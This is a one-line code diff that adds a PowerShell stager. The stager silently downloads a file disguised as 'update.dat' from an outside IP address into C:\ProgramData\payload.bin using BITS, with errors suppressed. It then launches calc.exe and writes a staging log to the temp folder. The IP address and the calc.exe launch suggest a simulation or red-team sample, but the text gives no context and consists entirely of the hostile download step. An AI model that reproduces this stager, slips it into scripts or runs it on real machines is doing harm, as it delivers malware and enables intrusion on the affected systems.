@@ -1,0 +1,1 @@
+try { $Stage1Url = "https://203.0.113.222/update.dat"; $OutputPath = 'C:\ProgramData\payload.bin'; Start-BitsTransfer -Source $Stage1Url -Destination $OutputPath -ErrorAction SilentlyContinue; & 'calc.exe'; Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append; Set-Location -Path $env:TEMP } catch { Write-Warning "Remote fetch failed" }
